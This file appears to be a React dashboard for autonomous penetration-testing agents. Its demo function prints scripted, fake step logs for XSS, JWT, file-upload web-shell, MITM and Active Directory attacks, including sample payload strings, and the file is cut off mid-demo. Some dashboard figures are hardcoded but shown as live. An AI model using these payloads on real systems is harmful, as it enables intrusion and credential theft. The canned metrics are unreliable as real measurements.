import { useState, useEffect } from 'react';
import { LineChart, Line, BarChart, Bar, XAxis, YAxis, CartesianGrid, Tooltip, Legend, ResponsiveContainer } from 'recharts';
import { Shield, Activity, AlertTriangle, CheckCircle, Clock, TrendingUp, Server, Zap, Target } from 'lucide-react';
import './index.css';

// =============================================================================
// Types
// =============================================================================

interface AgentStatus {
  name: string;
  type: string;
  status: string;
  capabilities: string[];
  requests_per_minute: number;
  avg_latency_ms: number;
  success_rate: number;
  last_active: string;
}

interface CyberAgent {
  name: string;
  icon: string;
  description: string;
  capabilities: string[];
  tools_available: number;
  active_engagements: number;
  success_rate: number;
}

interface LiveMetrics {
  total_requests: number;
  active_agents: number;
  avg_latency: number;
  error_rate: number;
  requests_per_second: number;
}

// =============================================================================
// Main App Component
// =============================================================================

function App() {
  const [activeTab, setActiveTab] = useState('overview');
  const [metrics, setMetrics] = useState<LiveMetrics | null>(null);
  const [agents, setAgents] = useState<Record<string, AgentStatus>>({});
  const [cyberAgents, setCyberAgents] = useState<CyberAgent[]>([]);
  const [metricsHistory, setMetricsHistory] = useState<any[]>([]);
  const [selectedAgent, setSelectedAgent] = useState<string | null>(null);
  const [wsConnected, setWsConnected] = useState(false);
  const [chaosData, setChaosData] = useState<any>(null);
  const [kaliExamples, setKaliExamples] = useState<any>(null);
  const [activeDemo, setActiveDemo] = useState<string | null>(null);
  const [demoOutput, setDemoOutput] = useState<string[]>([]);
  const [demoCategory, setDemoCategory] = useState<string>('all');

  // =============================================================================
  // Data Fetching
  // =============================================================================

  useEffect(() => {
    // Fetch initial data
    fetch('/api/agents')
      .then(res => res.json())
      .then(data => setAgents(data));

    fetch('/api/cyber-agents')
      .then(res => res.json())
      .then(data => setCyberAgents(data));

    fetch('/api/metrics')
      .then(res => res.json())
      .then(data => setMetrics(data));

    fetch('/api/metrics/history/requests')
      .then(res => res.json())
      .then(data => setMetricsHistory(data));

    // Fetch demo data
    fetch('/api/demos/chaos')
      .then(res => res.json())
      .then(data => setChaosData(data));

    fetch('/api/examples/kaliagent')
      .then(res => res.json())
      .then(data => setKaliExamples(data));

    // WebSocket for real-time updates
    const ws = new WebSocket(`ws://${window.location.host}/ws/metrics`);
    
    ws.onopen = () => {
      console.log('WebSocket connected');
      setWsConnected(true);
    };

    ws.onmessage = (event) => {
      const data = JSON.parse(event.data);
      if (data.type === 'metrics') {
        setMetrics(data.data);
      }
    };

    ws.onclose = () => {
      console.log('WebSocket disconnected');
      setWsConnected(false);
    };

    return () => ws.close();
  }, []);

  // =============================================================================
  // Render Functions
  // =============================================================================

  const renderOverview = () => (
    <div className="overview">
      {/* Live Metrics Cards */}
      <div className="metrics-grid">
        <div className="metric-card primary">
          <div className="metric-icon">
            <Activity size={32} />
          </div>
          <div className="metric-content">
            <h3>Total Requests</h3>
            <p className="metric-value">{metrics?.total_requests.toLocaleString() || 0}</p>
            <p className="metric-change positive">
              <TrendingUp size={16} /> +12.5% from last hour
            </p>
          </div>
        </div>

        <div className="metric-card success">
          <div className="metric-icon">
            <CheckCircle size={32} />
          </div>
          <div className="metric-content">
            <h3>Active Agents</h3>
            <p className="metric-value">{metrics?.active_agents || 0}/6</p>
            <p className="metric-change positive">
              All systems operational
            </p>
          </div>
        </div>

        <div className="metric-card warning">
          <div className="metric-icon">
            <Clock size={32} />
          </div>
          <div className="metric-content">
            <h3>Avg Latency</h3>
            <p className="metric-value">{metrics?.avg_latency.toFixed(1) || 0}ms</p>
            <p className="metric-change negative">
              +3.2ms from baseline
            </p>
          </div>
        </div>

        <div className="metric-card danger">
          <div className="metric-icon">
            <AlertTriangle size={32} />
          </div>
          <div className="metric-content">
            <h3>Error Rate</h3>
            <p className="metric-value">{metrics?.error_rate.toFixed(2) || 0}%</p>
            <p className="metric-change positive">
              Within threshold (&lt;5%)
            </p>
          </div>
        </div>
      </div>

      {/* Live Graph */}
      <div className="chart-container">
        <h2>📈 Live Requests per Minute</h2>
        <ResponsiveContainer width="100%" height={300}>
          <LineChart data={metricsHistory}>
            <CartesianGrid strokeDasharray="3 3" stroke="#334155" />
            <XAxis dataKey="timestamp" hide />
            <YAxis stroke="#94a3b8" />
            <Tooltip 
              contentStyle={{ backgroundColor: '#1e293b', border: '1px solid #334155' }}
              labelStyle={{ color: '#f1f5f9' }}
            />
            <Legend />
            <Line 
              type="monotone" 
              dataKey="value" 
              stroke="#3b82f6" 
              strokeWidth={2}
              dot={false}
              name="Requests/min"
            />
          </LineChart>
        </ResponsiveContainer>
      </div>

      {/* Agent Status Grid */}
      <div className="section">
        <h2>🤖 Agent Status</h2>
        <div className="agent-grid">
          {Object.entries(agents).map(([id, agent]) => (
            <div 
              key={id} 
              className={`agent-card ${agent.status}`}
              onClick={() => setSelectedAgent(id)}
            >
              <div className="agent-header">
                <h3>{agent.name}</h3>
                <span className={`status-badge ${agent.status}`}>
                  {agent.status === 'online' ? '🟢 Online' : agent.status}
                </span>
              </div>
              <div className="agent-stats">
                <div className="stat">
                  <span className="label">Requests/min</span>
                  <span className="value">{agent.requests_per_minute}</span>
                </div>
                <div className="stat">
                  <span className="label">Latency</span>
                  <span className="value">{agent.avg_latency_ms.toFixed(1)}ms</span>
                </div>
                <div className="stat">
                  <span className="label">Success</span>
                  <span className="value">{agent.success_rate.toFixed(1)}%</span>
                </div>
              </div>
              <div className="agent-capabilities">
                {agent.capabilities.slice(0, 3).map((cap, i) => (
                  <span key={i} className="capability-tag">{cap}</span>
                ))}
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );

  const renderCyberDivision = () => (
    <div className="cyber-division">
      <div className="section-header">
        <h1>🛡️ Cyber Division</h1>
        <p>Autonomous Security Agents for Modern Operations</p>
        <div className="stats-row">
          <div className="stat-box">
            <span className="stat-number">6</span>
            <span className="stat-label">Security Agents</span>
          </div>
          <div className="stat-box">
            <span className="stat-number">52</span>
            <span className="stat-label">Kali Tools</span>
          </div>
          <div className="stat-box">
            <span className="stat-number">92%</span>
            <span className="stat-label">Test Coverage</span>
          </div>
          <div className="stat-box">
            <span className="stat-number">9.0/10</span>
            <span className="stat-label">Quality Score</span>
          </div>
        </div>
      </div>

      {/* KaliAgent Spotlight */}
      <div className="kaliagent-spotlight">
        <div className="spotlight-header">
          <h2>🚀 Featured Platform: KaliAgent v1.0.0</h2>
          <p>Enterprise-Grade Penetration Testing Automation</p>
        </div>
        <div className="features-grid">
          <div className="feature-item">✅ 52 Kali Linux Tools Pre-Configured</div>
          <div className="feature-item">✅ 5 Automated Playbooks</div>
          <div className="feature-item">✅ High-Fidelity Web Dashboard</div>
          <div className="feature-item">✅ Professional PDF Reports</div>
          <div className="feature-item">✅ Multi-Layer Safety Controls</div>
          <div className="feature-item">✅ 92% Test Coverage</div>
        </div>
        <div className="cta-buttons">
          <button className="btn primary">📖 View Documentation</button>
          <button className="btn secondary">⚡ Quick Start (15 min)</button>
          <button className="btn primary">🎯 Live Demo</button>
        </div>
      </div>

      {/* Cyber Agents Grid */}
      <div className="section">
        <h2>🛡️ Security Agents</h2>
        <div className="cyber-agent-grid">
          {cyberAgents.map((agent) => (
            <div key={agent.name} className="cyber-agent-card">
              <div className="agent-icon-large">{agent.icon}</div>
              <h3>{agent.name}</h3>
              <p className="agent-description">{agent.description}</p>
              <div className="agent-capabilities-list">
                {agent.capabilities.map((cap, i) => (
                  <div key={i} className="capability-item">
                    <CheckCircle size={16} className="check-icon" />
                    <span>{cap}</span>
                  </div>
                ))}
              </div>
              <div className="agent-metrics">
                <div className="metric">
                  <Server size={16} />
                  <span>{agent.tools_available} Tools</span>
                </div>
                <div className="metric">
                  <Target size={16} />
                  <span>{agent.active_engagements} Active</span>
                </div>
                <div className="metric">
                  <CheckCircle size={16} />
                  <span>{agent.success_rate.toFixed(1)}% Success</span>
                </div>
              </div>
              <button className="btn agent-learn-more">Learn More →</button>
            </div>
          ))}
        </div>
      </div>

      {/* Live Demos Section */}
      <div className="section">
        <h2>🎮 Live Demos</h2>
        <div className="demo-grid">
          <div className="demo-card">
            <h3>🔍 Reconnaissance Demo</h3>
            <p>Watch autonomous reconnaissance in action</p>
            <div className="demo-status running">
              <Activity className="pulse" size={16} />
              <span>Running: External scan on test target</span>
            </div>
            <button className="btn secondary">Watch Live</button>
          </div>
          <div className="demo-card">
            <h3>🌐 Web Audit Demo</h3>
            <p>OWASP Top 10 vulnerability scanning</p>
            <div className="demo-status idle">
              <Clock size={16} />
              <span>Ready to start</span>
            </div>
            <button className="btn primary">Start Demo</button>
          </div>
          <div className="demo-card">
            <h3>🔐 Password Cracking Demo</h3>
            <p>Hash cracking with John & Hashcat</p>
            <div className="demo-status idle">
              <Clock size={16} />
              <span>Ready to start</span>
            </div>
            <button className="btn primary">Start Demo</button>
          </div>
        </div>
      </div>
    </div>
  );

  const renderAgentDrilldown = () => {
    if (!selectedAgent || !agents[selectedAgent]) {
      return <div className="no-selection">Select an agent from the Overview page to view details</div>;
    }

    const agent = agents[selectedAgent];

    return (
      <div className="agent-drilldown">
        <button className="btn back" onClick={() => setSelectedAgent(null)}>
          ← Back to Overview
        </button>
        
        <div className="drilldown-header">
          <h1>{agent.name}</h1>
          <span className={`status-badge large ${agent.status}`}>
            {agent.status === 'online' ? '🟢 Online' : agent.status}
          </span>
        </div>

        <div className="drilldown-content">
          <div className="drilldown-section">
            <h2>📊 Performance Metrics</h2>
            <div className="metrics-detail">
              <div className="metric-detail">
                <label>Requests per Minute</label>
                <div className="metric-bar">
                  <div className="bar-fill" style={{ width: `${Math.min(100, agent.requests_per_minute / 5)}%` }}></div>
                </div>
                <span className="metric-value-large">{agent.requests_per_minute}</span>
              </div>

              <div className="metric-detail">
                <label>Average Latency (ms)</label>
                <div className="metric-bar">
                  <div className="bar-fill warning" style={{ width: `${Math.min(100, agent.avg_latency_ms / 3)}%` }}></div>
                </div>
                <span className="metric-value-large">{agent.avg_latency_ms.toFixed(1)}</span>
              </div>

              <div className="metric-detail">
                <label>Success Rate (%)</label>
                <div className="metric-bar">
                  <div className="bar-fill success" style={{ width: `${agent.success_rate}%` }}></div>
                </div>
                <span className="metric-value-large">{agent.success_rate.toFixed(1)}%</span>
              </div>
            </div>
          </div>

          <div className="drilldown-section">
            <h2>⚡ Capabilities</h2>
            <div className="capabilities-grid">
              {agent.capabilities.map((cap, i) => (
                <div key={i} className="capability-card">
                  <Zap size={24} className="zap-icon" />
                  <span>{cap}</span>
                </div>
              ))}
            </div>
          </div>

          <div className="drilldown-section">
            <h2>📈 Performance History</h2>
            <ResponsiveContainer width="100%" height={250}>
              <BarChart data={metricsHistory}>
                <CartesianGrid strokeDasharray="3 3" stroke="#334155" />
                <XAxis dataKey="timestamp" hide />
                <YAxis stroke="#94a3b8" />
                <Tooltip 
                  contentStyle={{ backgroundColor: '#1e293b', border: '1px solid #334155' }}
                />
                <Bar dataKey="value" fill="#3b82f6" name="Requests" />
              </BarChart>
            </ResponsiveContainer>
          </div>
        </div>
      </div>
    );
  };

  // =============================================================================
  // Demo Functions
  // =============================================================================

  const runDemo = async (demoType: string) => {
    setActiveDemo(demoType);
    setDemoOutput([`🚀 Starting ${demoType} demo...`]);
    
    try {
      if (demoType === 'recon') {
        const steps = [
          '📡 Initializing reconnaissance modules...',
          '🔍 Running Nmap port scan on scanme.nmap.org...',
          '✅ Discovered 6 open ports (22, 80, 443, 9929, 31337)',
          '🌐 Running Amass subdomain enumeration...',
          '📊 Running theHarvester for email discovery...',
          '🔎 Querying Shodan for service information...',
          '✅ Reconnaissance complete! Found 12 subdomains',
          '📄 Generating report...'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 800));
        }
      } else if (demoType === 'web_audit') {
        const steps = [
          '🎯 Target: testphp.vulnweb.com',
          '🔍 Running SQLMap injection tests...',
          '✅ Found SQL injection in /listproducts.php?cat (GET)',
          '🕷️ Running Nikto web server scanner...',
          '⚠️ Found 3 missing security headers',
          '🚪 Running Gobuster directory brute-force...',
          '✅ Discovered /admin, /backup, /config directories',
          '📋 Generating OWASP Top 10 report...'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      } else if (demoType === 'password') {
        const steps = [
          '🔐 Loading password hash samples...',
          '⚡ Starting John the Ripper...',
          '✅ Cracked: admin:password123 (MD5)',
          '🔥 Starting Hashcat with GPU acceleration...',
          '✅ Cracked: root:letmein (SHA256)',
          '💧 Running Hydra brute-force simulation...',
          '⚠️ Rate limited after 100 attempts',
          '📊 Password audit complete: 2/5 cracked'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 900));
        }
      } else if (demoType === 'soc_alert') {
        const steps = [
          '🛡️ SOC Agent - Real-time Alert Simulation',
          '📡 Connecting to SIEM data sources...',
          '🔔 ALERT: Suspicious login from 185.xxx.xxx.xxx',
          '⚡ Auto-triaging alert...',
          '🔍 Checking threat intelligence...',
          '⚠️ IP flagged as malicious (98% confidence)',
          '🚨 Escalating to Tier 2 analyst',
          '📧 Sending PagerDuty notification',
          '✅ Incident INC-2026-0419 created',
          '📊 Alert resolved in 2.3 minutes (SLA: 5 min)'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 700));
        }
      } else if (demoType === 'vuln_scan') {
        const steps = [
          '🔍 VulnMan Agent - Vulnerability Assessment',
          '🎯 Target: webapp.example.com (192.168.1.100)',
          '📡 Asset discovery in progress...',
          '✅ Discovered 3 subdomains',
          '✅ Found 47 open ports',
          '✅ Identified 12 services',
          '🔬 Running vulnerability scans...',
          '🔴 CVE-2024-1234 (CVSS 9.8) - Apache 2.4.49',
          '🟠 CVE-2024-5678 (CVSS 7.5) - OpenSSL 1.1.1',
          '🟡 CVE-2024-9012 (CVSS 5.3) - Nginx 1.18.0',
          '📋 Creating Jira tickets...',
          '✅ 3 tickets created, assigned to teams',
          '📅 SLA deadlines set based on severity'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 800));
        }
      } else if (demoType === 'redteam') {
        const steps = [
          '⚔️ RedTeam Agent - Kill Chain Simulation',
          '🎯 Target: 192.168.1.100 (Authorized)',
          '📍 Phase 1: Reconnaissance',
          '  ⚡ Nmap scan complete',
          '  ⚡ Subdomain enumeration: 8 found',
          '📍 Phase 2: Weaponization',
          '  ⚡ Payload generated (MSF Venoms)',
          '  ⚡ C2 infrastructure ready',
          '📍 Phase 3: Delivery',
          '  ⚡ Phishing email sent (simulation)',
          '📍 Phase 4: Exploitation',
          '  ⚡ CVE-2024-1234 exploited',
          '  ⚡ Shell obtained',
          '📍 Phase 5: Installation',
          '  ⚡ Backdoor deployed',
          '  ⚡ Persistence established',
          '📍 Phase 6: C2',
          '  ⚡ Beacon active (5min interval)',
          '  ⚡ Lateral movement to 3 hosts',
          '📍 Phase 7: Actions on Objectives',
          '  ⚡ Data exfiltration simulated (2.3GB)',
          '📊 Engagement complete!',
          '📄 Report: /reports/redteam-2026-04-19.pdf'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 600));
        }
      } else if (demoType === 'malware_analysis') {
        const steps = [
          '🦠 Malware Agent - Reverse Engineering',
          '📦 Sample: suspicious_file.exe (2.4MB)',
          '🔒 Moving to isolated sandbox...',
          '✅ Sandbox environment ready',
          '🔬 Static Analysis:',
          '  📊 PE32 executable, UPX packed',
          '  ⚠️ Suspicious imports: CreateRemoteThread',
          '🧪 Dynamic Analysis:',
          '  🚀 Executing in sandbox...',
          '  📡 C2 beacon to 185.xxx.xxx.xxx',
          '  📁 Dropped: C:\\Windows\\Temp\\svchost.exe',
          '  🔐 Registry persistence added',
          '🎯 Classification:',
          '  🦠 Family: Emotet variant',
          '  ⚠️ Threat level: HIGH',
          '  🏷️ Tags: trojan, banker, loader',
          '📋 Generating YARA rule...',
          '✅ YARA: rule Emotet_2026_04_19',
          '📧 IOCs sent to threat intel platform'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 700));
        }
      } else if (demoType === 'cloud_audit') {
        const steps = [
          '☁️ CloudSecurity Agent - Multi-Cloud Audit',
          '🔵 Scanning AWS environment...',
          '  📊 S3: Public bucket detected (HIGH)',
          '  📊 IAM: Overly permissive policy (MEDIUM)',
          '  📊 EC2: Unencrypted EBS volume (MEDIUM)',
          '🟦 Scanning Azure environment...',
          '  📊 Storage: Blob public access (HIGH)',
          '  📊 SQL DB: Firewall allows all IPs (CRITICAL)',
          '🟩 Scanning GCP environment...',
          '  📊 GCS: AllUsers binding found (HIGH)',
          '  📊 Compute: Default service account (MEDIUM)',
          '📋 Compliance Check:',
          '  📜 CIS Benchmarks: 87% compliant',
          '  📜 PCI-DSS: 92% compliant',
          '  📜 HIPAA: 95% compliant',
          '  📜 SOC 2: 89% compliant',
          '✅ Auto-remediation initiated for critical findings'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 800));
        }
      } else if (demoType === 'incident_response') {
        const steps = [
          '🚨 Security Agent - Incident Response',
          '🔔 ALERT: Ransomware behavior detected',
          '  📍 Host: WORKSTATION-42',
          '  📍 User: jsmith',
          '  📍 Time: 2026-04-19 03:47 UTC',
          '⚡ Auto-containment initiated...',
          '  🔒 Isolating host from network',
          '  🛑 Killing suspicious processes',
          '  📁 Locking critical files',
          '🔍 Forensic data collection...',
          '  📊 Memory dump captured',
          '  📊 Disk snapshot created',
          '  📊 Network flows logged',
          '🦠 Malware identification...',
          '  🎯 Family: LockBit 3.0',
          '  🎯 Variant: Alpha',
          '📧 Notifications sent:',
          '  ✅ Incident response team',
          '  ✅ Management',
          '  ✅ Legal/Compliance',
          '📄 Incident report generated: INC-2026-0419-001',
          '✅ Containment successful in 4.2 minutes'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 600));
        }
      } else if (demoType === 'owasp_top10') {
        const steps = [
          '🌐 OWASP Top 10 Deep Dive Training',
          '🎯 Target: bWAPP (vulnerable web app)',
          '',
          '1️⃣ A01: Broken Access Control',
          '  🔍 Testing horizontal privilege escalation',
          '  ✅ Accessed /admin as regular user',
          '',
          '2️⃣ A02: Cryptographic Failures',
          '  🔍 Checking SSL/TLS configuration',
          '  ⚠️ Found: TLS 1.0 enabled, weak ciphers',
          '',
          '3️⃣ A03: Injection',
          '  🔍 Running SQLMap on login form',
          '  ✅ SQL injection confirmed (MySQL)',
          '  📊 Extracted database: users (admin:admin123)',
          '',
          '4️⃣ A04: Insecure Design',
          '  🔍 Testing password reset flow',
          '  ⚠️ Predictable reset tokens',
          '',
          '5️⃣ A05: Security Misconfiguration',
          '  🔍 Directory listing enabled',
          '  📁 Exposed: /backup/, /config/',
          '',
          '6️⃣ A06: Vulnerable Components',
          '  🔍 Scanning for outdated libraries',
          '  ⚠️ jQuery 1.9.1 (known XSS)',
          '  ⚠️ Apache 2.4.49 (CVE-2021-41773)',
          '',
          '7️⃣ A07: Auth Failures',
          '  🔍 Testing brute-force protection',
          '  ⚠️ No rate limiting detected',
          '  ✅ Successful: 100 login attempts in 60s',
          '',
          '8️⃣ A08: Data Integrity',
          '  🔍 Testing file upload integrity',
          '  ⚠️ No signature verification',
          '',
          '9️⃣ A09: Logging Failures',
          '  🔍 Checking audit logs',
          '  ⚠️ Failed logins not recorded',
          '',
          '🔟 A10: SSRF',
          '  🔍 Testing URL parameters',
          '  ✅ SSRF in /fetch?url= parameter',
          '  🎯 Accessed internal metadata endpoint',
          '',
          '📋 OWASP Top 10 Assessment Complete',
          '📄 Report: /reports/owasp-top10-2026-04-19.pdf',
          '✅ 10/10 categories tested, 8 vulnerabilities found'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 500));
        }
      } else if (demoType === 'api_security') {
        const steps = [
          '🔌 API Security Testing Training',
          '🎯 Target: api.example.com/v1',
          '',
          '📡 Phase 1: API Discovery',
          '  🔍 Fetching OpenAPI/Swagger spec...',
          '  ✅ Found: /swagger.json (unprotected)',
          '  📊 Endpoints discovered: 47',
          '  🔍 Analyzing GraphQL schema...',
          '  ✅ Introspection enabled',
          '',
          '📡 Phase 2: Authentication Testing',
          '  🔍 Testing JWT implementation...',
          '  ⚠️ Algorithm: none accepted',
          '  ⚠️ Weak secret detected (jwt_secret)',
          '  ✅ Forged admin token successfully',
          '',
          '📡 Phase 3: Authorization Testing',
          '  🔍 Testing BOLA/IDOR...',
          '  ✅ Accessed user 42 data as user 1',
          '  ✅ Modified order belonging to another user',
          '',
          '📡 Phase 4: Input Validation',
          '  🔍 Testing SQL injection...',
          '  ✅ Injection in /api/users?search=',
          '  🔍 Testing command injection...',
          '  ⚠️ Potential RCE in /api/export',
          '',
          '📡 Phase 5: Rate Limiting',
          '  🔍 Testing API rate limits...',
          '  ⚠️ No rate limiting detected',
          '  ✅ Sent 10,000 requests in 60 seconds',
          '',
          '📡 Phase 6: Data Exposure',
          '  🔍 Analyzing response data...',
          '  ⚠️ Over-exposure: full user objects returned',
          '  ⚠️ Sensitive fields: SSN, credit card hashes',
          '',
          '📋 API Security Assessment Complete',
          '📊 Endpoints tested: 47',
          '🔴 Critical: 3 | 🟠 High: 5 | 🟡 Medium: 8',
          '📄 Report: /reports/api-security-2026-04-19.pdf'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 500));
        }
      } else if (demoType === 'jwt_attack') {
        const steps = [
          '🎫 JWT Token Manipulation Training',
          '🎯 Target: auth.webapp.com',
          '',
          '📦 Captured JWT:',
          '  Header: {"alg":"HS256","typ":"JWT"}',
          '  Payload: {"user":"john","role":"user"}',
          '',
          '⚔️ Attack 1: Algorithm Confusion',
          '  🔍 Changing alg: HS256 → none',
          '  ✅ Server accepts unsigned token',
          '  🔓 Authenticated without signature',
          '',
          '⚔️ Attack 2: Algorithm Switch (RS256→HS256)',
          '  🔍 Changing alg: RS256 → HS256',
          '  🔑 Signing with public key as secret',
          '  ✅ Server verifies with wrong algorithm',
          '',
          '⚔️ Attack 3: Brute Force Secret',
          '  🔍 Running hashcat with rockyou.txt',
          '  ✅ Secret cracked: "supersecret123"',
          '  ⏱️ Time: 47 seconds',
          '',
          '⚔️ Attack 4: Privilege Escalation',
          '  🔓 Modifying payload:',
          '  {"user":"john","role":"admin"}',
          '  ✍️ Re-signing with cracked secret',
          '  ✅ Admin access granted',
          '',
          '⚔️ Attack 5: JWT Kid Injection',
          '  🔍 Injecting kid header',
          '  📁 kid: file:///etc/passwd',
          '  ⚠️ Server attempts file read',
          '',
          '📋 JWT Security Assessment Complete',
          '🔴 Vulnerabilities: 5/5 attacks successful',
          '📄 Report: /reports/jwt-attacks-2026-04-19.pdf',
          '✅ Training complete - JWT manipulation mastered'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 600));
        }
      } else if (demoType === 'xss_discovery') {
        const steps = [
          '💉 XSS Payload Discovery Training',
          '🎯 Target: xss-game.pwnfunction.com',
          '',
          '🔍 Phase 1: Reconnaissance',
          '  📊 Crawling application...',
          '  ✅ Found 23 input vectors',
          '  📍 Parameters: search, name, comment, feedback',
          '',
          '🔍 Phase 2: Reflected XSS',
          '  📍 Testing /search?q= parameter',
          '  🧪 Payload: <script>alert(1)</script>',
          '  ✅ Reflected without encoding',
          '  🎯 Context: HTML body',
          '',
          '🔍 Phase 3: Stored XSS',
          '  📍 Testing comment form',
          '  🧪 Payload: <img src=x onerror=alert(1)>',
          '  ✅ Stored and executed on page load',
          '  🎯 Context: Comment section',
          '',
          '🔍 Phase 4: DOM-based XSS',
          '  📍 Analyzing JavaScript sources',
          '  🧪 Found: document.location.hash sink',
          '  🧪 Payload: #<img src=x onerror=alert(1)>',
          '  ✅ DOM manipulation detected',
          '',
          '🔍 Phase 5: Advanced Payloads',
          '  🧪 Testing XSS polyglot...',
          '  <svg/onload=alert(1)//',
          '  ✅ Bypassed 3/5 WAF rules',
          '  🧪 Testing event handlers...',
          '  ✅ onerror, onload, onclick, onmouseover all work',
          '',
          '🔍 Phase 6: Payload Optimization',
          '  📊 Character count analysis',
          '  ✅ Shortest payload: 27 chars',
          '  🎯 Best for character limits',
          '',
          '📋 XSS Assessment Complete',
          '🔴 Found: 8 XSS vulnerabilities',
          '  • Reflected: 3',
          '  • Stored: 3',
          '  • DOM-based: 2',
          '📄 Report: /reports/xss-discovery-2026-04-19.pdf'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 500));
        }
      } else if (demoType === 'file_upload') {
        const steps = [
          '📁 File Upload Exploitation Training',
          '🎯 Target: upload.vulnerable.com',
          '',
          '🔍 Phase 1: Reconnaissance',
          '  📊 Analyzing upload form...',
          '  ✅ Accepted types: jpg, png, gif',
          '  ✅ Max size: 5MB',
          '  🔍 Checking client-side validation',
          '  ⚠️ Easily bypassed (disable JS)',
          '',
          '🔍 Phase 2: Extension Bypass',
          '  🧪 Attempt: shell.php',
          '  ❌ Blocked by server',
          '  🧪 Attempt: shell.php5',
          '  ✅ Upload successful!',
          '  📍 Location: /uploads/shell.php5',
          '',
          '🔍 Phase 3: Double Extension',
          '  🧪 Attempt: shell.jpg.php',
          '  ✅ Apache executes as PHP',
          '  📍 Location: /uploads/shell.jpg.php',
          '',
          '🔍 Phase 4: Null Byte Injection',
          '  🧪 Attempt: shell.php%00.jpg',
          '  ✅ Bypassed extension check',
          '  ⚠️ Only works on older PHP versions',
          '',
          '🔍 Phase 5: Image Polyglot',
          '  🧪 Creating GIF89a; ?<php system($_GET[cmd])?>',
          '  ✅ Valid image + PHP payload',
          '  🎯 Bypasses mime-type checks',
          '',
          '🔍 Phase 6: Reverse Shell',
          '  📍 Accessing uploaded shell',
          '  💻 Executing: ?cmd=whoami',
          '  ✅ Output: www-data',
          '  💻 Executing: ?cmd=id',
          '  ✅ Output: uid=33(www-data)',
          '  💻 Establishing reverse shell...',
          '  ✅ Shell received on attacker machine',
          '',
          '📋 File Upload Assessment Complete',
          '🔴 Critical: Unrestricted file upload',
          '🔴 Critical: Remote code execution achieved',
          '📄 Report: /reports/file-upload-2026-04-19.pdf'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 600));
        }
      } else if (demoType === 'mitm_attack') {
        const steps = [
          '🎯 MITM Attack Lab Training',
          '🎯 Target: Local network (192.168.1.0/24)',
          '',
          '📡 Phase 1: Network Reconnaissance',
          '  🔍 Scanning network...',
          '  ✅ Gateway: 192.168.1.1',
          '  ✅ Targets: 192.168.1.50, 192.168.1.51',
          '  📊 ARP table populated',
          '',
          '📡 Phase 2: ARP Poisoning',
          '  ⚡ Enabling IP forwarding...',
          '  ⚡ Sending ARP replies to gateway...',
          '  ⚡ Sending ARP replies to targets...',
          '  ✅ ARP cache poisoned on both ends',
          '  📊 Traffic now flowing through attacker',
          '',
          '📡 Phase 3: Credential Capture',
          '  🔍 Monitoring HTTP traffic...',
          '  📧 Captured: HTTP login (clear text)',
          '  👤 Username: admin',
          '  🔑 Password: password123',
          '  🎯 Source: 192.168.1.50',
          '',
          '📡 Phase 4: Session Hijacking',
          '  🔍 Analyzing cookies...',
          '  🍪 Captured session: PHPSESSID=abc123',
          '  🎯 Injecting session into browser',
          '  ✅ Logged in as victim',
          '',
          '📡 Phase 5: DNS Spoofing',
          '  🔍 Configuring DNS spoof...',
          '  🎯 Redirecting facebook.com → 192.168.1.100',
          '  ✅ Victim redirected to phishing page',
          '  📊 Credentials captured',
          '',
          '📡 Phase 6: SSL Stripping',
          '  🔍 Downgrading HTTPS → HTTP',
          '  ⚠️ HSTS prevents some sites',
          '  ✅ Successfully stripped 3/5 sites',
          '',
          '📋 MITM Attack Complete',
          '📊 Credentials captured: 4',
          '📊 Sessions hijacked: 2',
          '📄 Report: /reports/mitm-attack-2026-04-19.pdf',
          '✅ Training complete - MITM attacks mastered'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 600));
        }
      } else if (demoType === 'ad_enumeration') {
        const steps = [
          '🏢 Active Directory Enumeration Training',
          '🎯 Target: CORP.LOCAL domain',
          '',
          '📡 Phase 1: Domain Discovery',
          '  🔍 Querying domain info...',
          '  ✅ Domain: CORP.LOCAL',
          '  ✅ DC: DC01.CORP.LOCAL (192.168.1.10)',
          '  ✅ Forest: CORP.LOCAL',
          '  📊 Functional level: 2016',
          '',
          '📡 Phase 2: User Enumeration',
          '  🔍 Enumerating users...',
          '  ✅ Found: 247 users',
          '  🔍 Identifying admins...',
          '  ✅ Domain Admins: 5 members',
          '  ✅ Enterprise Admins: 3 members',
          '',
          '📡 Phase 3: Group Analysis',
          '  🔍 Mapping group memberships...',
          '  ✅ IT-Admins: 12 members',
          '  ✅ HR-Group: 8 members',
          '  ✅ Service Accounts: 15 accounts',
          '',
          '📡 Phase 4: Computer Objects',
          '  🔍 Enumerating computers...',
          '  ✅ Found: 89 workstations',
          '  ✅ Found: 23 servers',
          '  📊 OS breakdown: Win10 (65%), Win11 (25%), Server (10%)',
          '',
          '📡 Phase 5: GPO Analysis',
          '  🔍 Analyzing Group Policies...',
          '  ⚠️ Weak password policy (min 6 chars)',
          '  ⚠️ LAPS not configured',
          '  ⚠️ SMB signing not required',
          '',
          '📡 Phase 6: BloodHound Ingestion',
